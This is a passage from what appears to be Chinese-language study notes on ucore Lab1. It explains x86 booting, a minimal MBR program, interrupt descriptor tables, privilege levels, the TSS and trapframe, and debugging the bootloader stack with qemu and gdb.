<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu –S</span><br></pre></td></tr></table></figure>
<p>然后通过按”Ctrl+Alt+2”进入qemu的monitor界面，为了了解80386此时的寄存器内容，在monitor界面下输入命令：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info registers</span><br></pre></td></tr></table></figure>
<p>显示以下数据：</p>
<img src="/2022/04/09/Ucore-Lab1/1647232846489.png" class width="1647232846489"> 
<p>发现 CS selector = 0xf000，CS base =  0xffff0000，EIP = 0x0000fff0</p>
<p>当前指令地址为：0xf000 * 16 + 0x0000fff0 = 0xffff0</p>
<p><strong>从BIOS到BootLoader</strong></p>
<p>BIOS加载存储设备上，第一个扇区（通常512字节）到内存（0x7c00），然后跳转到 0x7c00 的第一条地址开始执行</p>
<p>这512字节就是 MBR，其中包含了BootLoader（最后两字节固定）</p>
<ul>
<li>由于实模式下最高寻址1MB，故 <code>0xFFFF0</code> 处是一条跳转指令 <code>jmp far f000:e05b</code> ，跳转至BIOS真正的代码</li>
<li>之后便开始检测并初始化外设，与 <code>0x000-0x3ff</code> 建立数据结构，中断向量表IVT并填写中断例程</li>
<li>BIOS最后校验启动盘中位于0盘0道1扇区(MBR)的内容，如果此扇区末尾两个字节分别是魔数 <code>0x55</code> 和 <code>0xaa</code> ，则BIOS认为此扇区中存在可执行的程序，并加载该512字节数据到 <code>0x7c00</code> ，随后跳转至此继续执行</li>
</ul>
<p><strong>从BootLoader到OS</strong></p>
<p>MBR是主引导记录（Master Boot Record），也被称为主引导扇区，是计算机开机以后访问硬盘时所必须要读取的第一个扇区，其内部前446字节存储了 bootloader 代码，其后是4个16字节的“磁盘分区表”</p>
<p>BootLoader完成的工作：</p>
<ul>
<li>使系统从“实模式”变为“保护模式”，开启段机制（拥有4GB的访问空间）</li>
<li>从硬盘上读取 kernel in ELF 格式的 ucore kernel 并放到内存中固定位置</li>
<li>跳转到 ucore OS 的入口点，把控制权转移到 ucore OS 中</li>
</ul>
<p>以下是一个简单的 MBR 结构：（该程序只会将 <code>1 MBR</code> 字符串打印到屏幕上并挂起）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">;主引导程序</span><br><span class="line">;------------------------------------------------------------</span><br><span class="line">SECTION MBR vstart=0x7c00 ; 起始地址编译为0x7c00</span><br><span class="line">  mov ax,cs   ; 此时的cs为0，用0来初始化所有的段寄存器</span><br><span class="line">  mov ds,ax</span><br><span class="line">  mov es,ax</span><br><span class="line">  mov ss,ax</span><br><span class="line">  mov fs,ax</span><br><span class="line">  mov sp,0x7c00 ; 0x7c00 以下空间暂时安全，故可用做栈。</span><br><span class="line"></span><br><span class="line">; 清屏 利用0x06号功能，上卷全部行，则可清屏。</span><br><span class="line">; -----------------------------------------------------------</span><br><span class="line">;INT 0x10   功能号:0x06   功能描述:上卷窗口</span><br><span class="line">;------------------------------------------------------</span><br><span class="line">;输入：</span><br><span class="line">;AH 功能号= 0x06</span><br><span class="line">;AL = 上卷的行数(如果为0,表示全部)</span><br><span class="line">;BH = 上卷行属性</span><br><span class="line">;(CL,CH) = 窗口左上角的(X,Y)位置</span><br><span class="line">;(DL,DH) = 窗口右下角的(X,Y)位置</span><br><span class="line">;无返回值：</span><br><span class="line">  mov     ax, 0x600</span><br><span class="line">  mov     bx, 0x700</span><br><span class="line">  mov     cx, 0          ; 左上角: (0, 0)</span><br><span class="line">  mov     dx, 0x184f     ; 右下角: (80,25),</span><br><span class="line">        ; VGA文本模式中,一行只能容纳80个字符,共25行。</span><br><span class="line">        ; 下标从0开始,所以0x18=24,0x4f=79</span><br><span class="line">  int     0x10            ; int 0x10</span><br><span class="line"></span><br><span class="line">;;;;;;;;;    下面这三行代码是获取光标位置    ;;;;;;;;;</span><br><span class="line">;.get_cursor获取当前光标位置,在光标位置处打印字符.</span><br><span class="line">  mov ah, 3   ; 输入: 3 号子功能是获取光标位置,需要存入ah寄存器</span><br><span class="line">  mov bh, 0   ; bh寄存器存储的是待获取光标的页号</span><br><span class="line"></span><br><span class="line">  int 0x10    ; 输出: ch=光标开始行,cl=光标结束行</span><br><span class="line">      ; dh=光标所在行号,dl=光标所在列号</span><br><span class="line"></span><br><span class="line">;;;;;;;;;    获取光标位置结束    ;;;;;;;;;;;;;;;;</span><br><span class="line"></span><br><span class="line">;;;;;;;;;     打印字符串    ;;;;;;;;;;;</span><br><span class="line">  ;还是用10h中断,不过这次是调用13号子功能打印字符串</span><br><span class="line">  mov ax, message</span><br><span class="line">  mov bp, ax    ; es:bp 为串首地址, es此时同cs一致，</span><br><span class="line">      ; 开头时已经为sreg初始化</span><br><span class="line"></span><br><span class="line">  ; 光标位置要用到dx寄存器中内容,cx中的光标位置可忽略</span><br><span class="line">  mov cx, 5   ; cx 为串长度,不包括结束符0的字符个数</span><br><span class="line">  mov ax, 0x1301  ; 子功能号13是显示字符及属性,要存入ah寄存器,</span><br><span class="line">      ; al设置写字符方式 ah=01: 显示字符串,光标跟随移动</span><br><span class="line">  mov bx, 0x2 ; bh存储要显示的页号,此处是第0页,</span><br><span class="line">      ; bl中是字符属性, 属性黑底绿字(bl = 02h)</span><br><span class="line">  int 0x10    ; 执行BIOS 0x10 号中断</span><br><span class="line">;;;;;;;;;      打字字符串结束 ;;;;;;;;;;;;;;;</span><br><span class="line"></span><br><span class="line">  jmp $   ; 始终跳转到这条代码，为死循环，使程序悬停在此</span><br><span class="line"></span><br><span class="line">  message db &quot;1 MBR&quot;</span><br><span class="line">  ; 用\0 将剩余空间填满</span><br><span class="line">  times 510-($-$$) db 0 ; $指代当前指令的地址，$$指代当前section的首地址</span><br><span class="line">  ; 最后两位一定是0x55, 0xaa</span><br><span class="line">  db 0x55,0xaa</span><br></pre></td></tr></table></figure>
<p><strong>加载 ELF 格式的 ucore OS kernel</strong></p>
<p>附件：Intel80386启动过程 </p>
<img src="/2022/04/09/Ucore-Lab1/1647233278724.png" class width="1647233278724"> 
<h2 id="x86中断简述"><a href="#x86中断简述" class="headerlink" title="x86中断简述"></a>x86中断简述</h2><p>在操作系统中，有三种特殊的中断事件：</p>
<ul>
<li>异步中断(asynchronous interrupt)：这是由CPU外部设备引起的外部事件中断，例如I/O中断、时钟中断、控制台中断等</li>
<li>同步中断(synchronous interrupt)：这是CPU执行指令期间检测到不正常的或非法的条件(如除零错、地址访问越界)所引起的内部事件</li>
<li>陷入中断(trap interrupt)：这是在程序中使用请求系统服务的系统调用而引发的事件</li>
</ul>
<p><strong>中断源</strong></p>
<ul>
<li>外部中断：外部设施产生的中断，具有异步性（不清楚它什么时候产生）</li>
<li>软件中断：软件，系统参数的中断，具有同步性（例如：INT 系统调用）</li>
<li>异常：程序错误，软件产生的异常，机器检查出的异常</li>
</ul>
<p>这些都需要 OS 进行正确的处理</p>
<p><strong>中断服务例程</strong></p>
<ul>
<li>每个中断异常与一个“中断服务例程ISR”关联（其关联关系存储在“中断描述符表IDT”中）</li>
<li>在“中断号”和“中断处理程序的地址”之间，通过“中断描述符表”建立了一种映射关系</li>
</ul>
<p><strong>中断描述符表</strong></p>
<ul>
<li>中断描述符表（Interrupt Descriptor Table, IDT）把每个中断或异常编号和一个指向中断服务例程的描述符联系起来，同GDT（全局描述符表）一样，IDT是一个8字节的描述符数组，但IDT的第一项可以包含一个描述符</li>
<li>IDT可以位于内存的任意位置，CPU通过IDT寄存器（IDTR）的内容来寻址IDT的起始地址</li>
</ul>
<p><strong>中断门描述符</strong></p>
<p>中断/异常应该使用 <code>Interrupt Gate</code> 或 <code>Trap Gate</code> ，其中的唯一区别就是：</p>
<ul>
<li>当调用 <code>Interrupt Gate</code> 时，Interrupt会被CPU自动禁止</li>
<li>而调用 <code>Trap Gate</code> 时，CPU则不会去禁止或打开中断，而是保留原样</li>
</ul>
<p>IDT中包含了3种类型的中断门描述符（Descriptor）</p>
<ul>
<li>Task-gate descriptor（任务门描述符）</li>
<li>Interrupt-gate descriptor（中断门描述符：中断方式用到）</li>
<li>Trap-gate descriptor（陷阱门描述符：系统调用用到）</li>
</ul>
<p>下图显示了80386的中断门描述符、陷阱门描述符的格式： </p>
<img src="/2022/04/09/Ucore-Lab1/1649144948571.png" class width="1649144948571">  
<h2 id="x86中断处理"><a href="#x86中断处理" class="headerlink" title="x86中断处理"></a>x86中断处理</h2><p><strong>起始阶段</strong></p>
<ul>
<li>CPU执行完每条指令后，判断中断控制器中是否产生中断，如果存在中断，则取出对应的中断变量</li>
<li>CPU根据中断变量，到IDT中找到对应的中断描述符</li>
<li>通过获取到的中断描述符中的段选择子，从GDT中取出对应的段描述符，此时便获取到了中断服务例程的段基址与属性信息，跳转至该地址</li>
<li>CPU会根据CPL和中断服务例程的段描述符的DPL信息确认是否发生了 <strong>特权级的转换</strong><ul>
<li>若发生了特权级的转换，这时CPU会从当前程序的TSS信息（该信息在内存中的起始地址存在TR寄存器中）里取得该程序的内核栈地址，即包括内核态的ss和esp的值</li>
<li>并立即将系统当前使用的栈切换成新的内核栈（这个栈就是即将运行的中断服务程序要使用的栈）</li>
<li>紧接着就将当前程序使用的用户态的ss和esp压到新的内核栈中保存起来</li>
</ul>
</li>
<li>CPU需要 <strong>开始保存当前被打断的程序的现场</strong> （即一些寄存器的值），以便于将来恢复被打断的程序继续执行。这需要利用内核栈来保存相关现场信息，即依次压入当前被打断程序使用的eflags，cs，eip，errorCode（如果是有错误码的异常）信息</li>
<li>CPU利用中断服务例程的段描述符将其第一条指令的地址加载到cs和eip寄存器中， <strong>开始执行中断服务例程</strong> （这意味着先前的程序被暂停执行，中断服务程序正式开始工作）</li>
</ul>
<p><strong>终止阶段</strong></p>
<p>每个中断服务例程在有中断处理工作完成后需要通过 <code>iret</code> （或 <code>iretd</code> ）指令恢复被打断的程序的执行（恢复各个寄存器的数据等等），CPU执行IRET指令的具体过程如下： </p>
<ul>
<li>程序执行这条 <code>iret</code> 指令时，首先会从内核栈里弹出先前保存的被打断的程序的现场信息，即eflags，cs，eip重新开始执行</li>
<li>如果存在特权级转换（从内核态转换到用户态），则还需要从内核栈中弹出用户态栈的ss和esp，即栈也被切换回原先使用的用户栈</li>
<li>如果此次处理的是带有错误码（errorCode）的异常，CPU在恢复先前程序的现场时，并不会弹出errorCode，需要要求相关的中断服务例程在调用iret返回之前添加出栈代码主动弹出errorCode</li>
</ul>
<h2 id="x86特权级别简述"><a href="#x86特权级别简述" class="headerlink" title="x86特权级别简述"></a>x86特权级别简述</h2><p>特权级别（Privilege Level）是存在于 Descriptor（描述符）及 Segment Selector（段选择子，存储在段寄存器以及门描述符中） 中一个数值，当这些 Descriptor 或 Segment Selector 要进行某些操作，或者被别的对象访问时，该数值用于控制它们能够进行的操作或者限制它们的可访问性</p>
<p>特权级共分为四档，分别为0-3：</p>
<ul>
<li>Kernel为第0特权级（ring 0）</li>
<li>用户程序为第3特权级（ring 3）</li>
<li>操作系统保护分别为第1和第2特权级</li>
</ul>
<p><strong>描述符特权级（DPL，Descriptor Privilege Level）</strong></p>
<ul>
<li>实施特权级保护的第一步，是为所有可管理的对象赋予一个特权级，以决定谁能访问它们，每个 Descriptor 都具有描述符特权级（DPL，Descriptor Privilege Level）字段，Descriptor 总是指向它所“描述”的目标对象，代表着该对象，因此该字段（DPL）实际上是目标对象的特权级</li>
<li>存储于段描述符中：</li>
</ul>
<img src="/2022/04/09/Ucore-Lab1/1649146076621.png" class width="1649146076621"> 
<p><strong>当前特权级（CPL，Current Privilege Level）</strong></p>
<ul>
<li>当处理器正在一个代码段中取指令和执行指令时，那个代码段的特权级叫做当前特权级（CPL，Current Privilege Level），正在执行的这个代码段，其选择子位于段寄存器CS中，其最低两位就是当前特权级的数值</li>
<li>存储于CS寄存器的段选择子中（CS中的DPL就是CPL）：</li>
</ul>
<img src="/2022/04/09/Ucore-Lab1/1649146195666.png" class width="1649146195666"> 
<p><strong>请求特权级（RPL，Request Privilege Level）</strong></p>
<ul>
<li>我们知道，要将控制从一个代码段转移到另一个代码段，通常是使用 <code>jmp</code> 和 <code>call</code> 指令，并在指令中提供目标代码段的选择子，以及段内偏移量(入口点)，而为了访问内存中的数据，也必须先将段选择子加载到段寄存器DS、ES、FS或者GS中，不管是实施控制转移，还是访问数据段，这都可以看成是一个请求，请求者提供一个段选择子，请求访问指定的段，从这个意义上来说，RPL也就是指请求者的特权级别（RPL，Request Privilege Level）</li>
<li>存储于段选择子中：（段选择子存储于各个段寄存器以及门描述符中：调用门、任务门、中断门、陷阱门）</li>
</ul>
<img src="/2022/04/09/Ucore-Lab1/1649146143417.png" class width="1649146143417"> 
<p><strong>输出特权级（IOPL，I/O Privilege Level）</strong></p>
<ul>
<li>除了那些特权级敏感的指令外，处理器还允许对各个特权级别所能执行的I/O操作进行控制，通常，这指的是端口访问的许可权，因为对设备的访问都是通过端口进行的</li>
<li>在处理器的标志寄存器EFLAGS中，位13、位12是IOPL位，也就是输入/输出特权级（IOPL，I/O Privilege Level），它代表着当前任务的I/O特权级别，某些指令，例如 IN，OUT，CLI 需要 I/O 特权，这些操作根据 IOPL 和 CPL 确定合法性</li>
<li>存储于EFLAGS中： </li>
</ul>
<img src="/2022/04/09/Ucore-Lab1/1649146429816.png" class width="1649146429816">  
<h2 id="x86特权级别运用"><a href="#x86特权级别运用" class="headerlink" title="x86特权级别运用"></a>x86特权级别运用</h2><p><strong>特权级检查</strong></p>
<p>在下述的特权级比较中，需要注意特权级越低，其ring值越大：</p>
<ul>
<li>访问门时（中断、陷入、异常），要求 <strong>DPL[段] &lt;= CPL &lt;= DPL[门]</strong> （ring值比较）<ul>
<li>访问门的代码权限比门的特权级要高，因为这样才能访问门（CPL &lt;= DPL[门]）</li>
<li>但访问门的代码权限比被访问的段的权限要低，因为通过门的目的是访问特权级更高的段，这样就可以达到低权限应用程序使用高权限内核服务的目的（CPL &lt;= DPL[门]）</li>
<li>简述：代码权限低于段权限时，可以通过访问门的方式来访问段</li>
</ul>
</li>
<li>访问段时，要求 <strong>DPL[段] &gt;= max {CPL, RPL}</strong> （ring值比较）<ul>
<li>只能使用最低的权限来访问段数据</li>
<li>简述：请求权限与当前权限只要有一个低于段权限，就会导致访问失败</li>
</ul>
</li>
</ul>
<p><strong>特权级切换</strong></p>
<p><strong>TSS</strong></p>
<p>TSS（Task State Segment）是操作系统在进行进程切换时保存进程现场信息的段，其结构如下：</p>
<img src="/2022/04/09/Ucore-Lab1/1649147399799.png" class width="1649147399799"> 
<ul>
<li>TSS中分别保留了 ring0、ring1、ring2 的栈，当用户程序从 ring3 跳至 ring0 时（例如执行中断），此时的栈就会从用户栈切换到内核栈，切换栈的操作从开始中断的那一瞬间就已完成（例如：从<code>int 0x78</code>到中断处理例程之间）</li>
<li>TSS段的段描述符保存在GDT中，其 ring0 的栈会在初始化GDT时被一起设置，<code>TR</code> 寄存器会保存当前TSS的段描述符，以提高索引速度</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">segdesc</span> <span class="title">gdt</span>[] =</span> &#123;</span><br><span class="line">    SEG_NULL,</span><br><span class="line">    [SEG_KTEXT] = SEG(STA_X | STA_R, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_KERNEL),</span><br><span class="line">    [SEG_KDATA] = SEG(STA_W, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_KERNEL),</span><br><span class="line">    [SEG_UTEXT] = SEG(STA_X | STA_R, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_USER),</span><br><span class="line">    [SEG_UDATA] = SEG(STA_W, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_USER),</span><br><span class="line">    [SEG_TSS]   = SEG_NULL,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">pseudodesc</span> <span class="title">gdt_pd</span> =</span> &#123;</span><br><span class="line">      <span class="keyword">sizeof</span>(gdt) - <span class="number">1</span>, (<span class="keyword">uintptr_t</span>)gdt</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* gdt_init - initialize the default GDT and TSS */</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function">  <span class="title">gdt_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 设置TSS的ring0栈地址，包括esp寄存器和SS段寄存器</span></span><br><span class="line">      load_esp0((<span class="keyword">uintptr_t</span>)bootstacktop);</span><br><span class="line">      ts.ts_ss0 = KERNEL_DS;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 将TSS写入GDT中</span></span><br><span class="line">      gdt[SEG_TSS] = SEGTSS(STS_T32A, (<span class="keyword">uintptr_t</span>)&amp;ts, <span class="keyword">sizeof</span>(ts), DPL_KERNEL);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 加载GDT至GDTR寄存器</span></span><br><span class="line">      lgdt(&amp;gdt_pd);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 加载TSS至TR寄存器</span></span><br><span class="line">      ltr(GD_TSS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>trapFrame</strong></p>
<p>trapframe 结构是进入中断门所必须的结构，中断处理例程的入口代码用于保存上下文并构建一个 trapframe</p>
<p>trapframe 的结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> &#123;</span></span><br><span class="line">    <span class="comment">// tf_regs保存了基本寄存器的值，包括eax,ebx,esi,edi寄存器等等</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pushregs</span> <span class="title">tf_regs</span>;</span></span><br><span class="line">    <span class="keyword">uint16_t</span> tf_gs;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding0;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_fs;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding1;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_es;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding2;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_ds;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding3;</span><br><span class="line">    <span class="keyword">uint32_t</span> tf_trapno;</span><br><span class="line">    <span class="comment">// 以下这些信息会被CPU硬件自动压入切换后的栈。包括下面切换特权级所使用的esp、ss等数据</span></span><br><span class="line">    <span class="keyword">uint32_t</span> tf_err;</span><br><span class="line">    <span class="keyword">uintptr_t</span> tf_eip;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_cs;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding4;</span><br><span class="line">    <span class="keyword">uint32_t</span> tf_eflags;</span><br><span class="line">    <span class="comment">// 以下这些信息会在切换特权级时被使用</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> tf_esp;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_ss;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding5;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure>
<p><strong>切换特权级的过程</strong></p>
<ul>
<li>特权级提升<ul>
<li>在陷入的一瞬间，CPU会因为特权级的改变，索引TSS，切换 <code>ss</code> 和 <code>esp</code> 为内核栈，并按顺序自动压入<code>user_ss</code>、<code>user_esp</code>、<code>user_eflags</code>、<code>user_cs</code>、<code>old_eip</code>以及<code>err</code></li>
<li>之后CPU会在中断处理例程入口处，先将剩余的段寄存器以及所有的通用寄存器压栈，构成一个 <code>trapframe</code> ，然后将该 <code>trapframe</code> 传入给真正的中断处理例程并执行</li>
<li>该处理例程会判断传入的中断数(<code>trapno</code>)并执行特定的代码，在提升特权级的代码中，程序会处理传入的 <code>trapframe</code> 信息中的 <code>CS、DS、eflags</code> 寄存器，修改上面的 DPL、CPL与IOPL 以达到提升特权的目的</li>
<li>将修改后的 <code>trapframe</code> 压入用户栈（这一步没有修改 <code>user_esp</code> 寄存器），并设置中断处理例程结束后将要弹出 <code>esp</code> 寄存器的值为用户栈的新地址（与刚刚不同，这一步修改了将要恢复的 <code>user_esp</code> 寄存器）</li>
<li>在内核中，“将修改后的trapframe压入用户栈”这一步，需要舍弃 <code>trapframe</code> 中末尾两个旧的<code>ss</code>和<code>esp</code>寄存器数据</li>
</ul>
</li>
<li>特权级降低<ul>
<li>与 ring3 调用中断不同，当 ring0 调用中断时，进入中断前和进入中断后的这个过程，栈不发生改变</li>
<li>修改后的 <code>trapFrame</code> 不需要像上面那样保存至将要使用的栈，因为当前环境下 <code>iret</code> 前后特权级会发生改变，执行该命令会弹出 <code>ss</code> 和 <code>esp</code> ，所以可以通过 <code>iret</code> 来设置返回时的栈地</li>
</ul>
</li>
</ul>
<h2 id="x86栈简述"><a href="#x86栈简述" class="headerlink" title="x86栈简述"></a>x86栈简述</h2><p>只有设置好的合适大小和地址的栈内存空间（简称栈空间），才能有效地进行函数调用，这里为了减少汇编代码量，我们就通过C代码来完成显示，由于需要调用C语言的函数，所以需要自己建立好栈空间，设置栈的代码如下： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movl    $start, %esp</span><br></pre></td></tr></table></figure>
<p>由于start位置（0x7c00）前的地址空间没有用到，所以可以用来作为bootloader的栈，由于栈是向下长的，所以不会破坏start位置后面的代码，我们可以通过用gdb调试bootloader来进一步观察栈的变化： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qemu -hda bin/ucore.img -S -s</span><br><span class="line">gdb obj/bootblock.o</span><br></pre></td></tr></table></figure>
<p>然后再GDB中输入以下指令来连接qemu：（可以使用 layout src 指令显示源码）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) target remote :<span class="number">1234</span> </span><br><span class="line">(gdb) <span class="keyword">break</span> bootasm.S:<span class="number">68</span></span><br><span class="line">(gdb) <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<p>接下来就可以通过 “ info registers esp ” 指令来打印 esp寄存器 的值了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">B+&gt;<span class="number">69</span>              movl $<span class="number">0x0</span>, %ebp </span><br><span class="line">------------------------------------</span><br><span class="line">(gdb) info <span class="keyword">register</span> esp</span><br><span class="line">esp            <span class="number">0x6f00</span>             </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">70</span>              movl $start, %esp            </span><br><span class="line">  &gt;<span class="number">71</span>              call bootmain</span><br><span class="line">------------------------------------</span><br><span class="line">(gdb) info <span class="keyword">register</span> esp</span><br><span class="line">esp            <span class="number">0x7c00</span>              <span class="number">0x7c00</span> &lt;start&gt;</span><br></pre></td></tr></table></figure>
<p>可以发现，程序把“$start”中的数据赋值给了esp，这就是栈的起始地址（栈顶）</p>
<p>看看程序是怎么处理 call 指令的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="function">si</span></span><br><span class="line"><span class="function"><span class="title">bootmain</span> <span class="params">()</span> at boot/bootmain.c:87</span></span><br><span class="line"><span class="function"><span class="params">(gdb)</span> info registers esp</span></span><br><span class="line"><span class="function">esp            0x7bfc              0<span class="title">x7bfc</span></span></span><br><span class="line"><span class="function"><span class="params">(gdb)</span> x/4x 0x7bfc <span class="comment">// esp中装了一个地址</span></span></span><br><span class="line"><span class="function">0x7bfc: 0x00007c4f      0xc031fcfa      0xc08ed88e</span></span><br><span class="line"><span class="function">        0<span class="title">x64e4d08e</span></span></span><br><span class="line"><span class="function"><span class="params">(gdb)</span> x/4i 0x7c4a <span class="comment">// 地址&quot;0x7c4f&quot;就是call指令的下一个指令,是函数&quot;bootmain&quot;的返回地址</span></span></span><br><span class="line"><span class="function">   0x7c4a &lt;protcseg+24&gt;:</span></span><br><span class="line"><span class="function">    call   0x7d0f &lt;bootmain&gt;</span></span><br><span class="line"><span class="function">   0x7c4f &lt;spin&gt;:       jmp    0x7c4f &lt;spin&gt;</span></span><br><span class="line"><span class="function">   0x7c51 &lt;spin+2&gt;:     lea    0<span class="title">x0</span><span class="params">(%esi)</span>,%esi</span></span><br><span class="line"><span class="function">   0x7c54 &lt;gdt&gt;:        add    %al,<span class="params">(%eax)</span></span></span><br></pre></td></tr></table></figure>
<h2 id="x86显示字符串"><a href="#x86显示字符串" class="headerlink" title="x86显示字符串"></a>x86显示字符串</h2><p>bootloader 只在CPU和内存中打转无法让读者很容易知道 bootloader 的工作是否正常，为此在成功完成了保护模式的转换并且设置好栈后，就可以调用 bootmain 函数显示字符串了，在 lab1 中使用了显示器和并口两种外设来显示字符串，主要的代码集中在 bootmain.c 中</p>
<p>这里采用的是很简单的基于Programmed I/O （PIO）方式，PIO方式是一种通过CPU执行I/O端口指令来进行数据读写的数据交换模式，被广泛应用于硬盘、光驱等设备的基础传输模式中（效率低下，但编程简单）</p>
<ul>
<li>计算机与IO接口的通信是通过计算机指令来实现的，通过软件指令选择IO接口上的功能、工作模式的做法，称为“IO接口控制编程”，通常是用端口读写指令in/out实现</li>
<li>端口是IO接口开发给CPU的接口，一般的IO接口都有一组端口，每个端口都有自己的用途</li>
</ul>
<p>指令in/out使用方式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">in al, dx  # al/ax 用于存放从端口读入的数据，dx指端口号</span><br><span class="line">in ax, dx</span><br><span class="line"></span><br><span class="line">out dx, al</span><br><span class="line">out dx, ax</span><br><span class="line">out 立即数, al</span><br><span class="line">out 立即数, ax</span><br></pre></td></tr></table></figure>
<p>在 bootmain.c 中的 lpt_putc 函数（定义在 console.c 中）完成了<strong>并口输出字符</strong>的工作：</p>
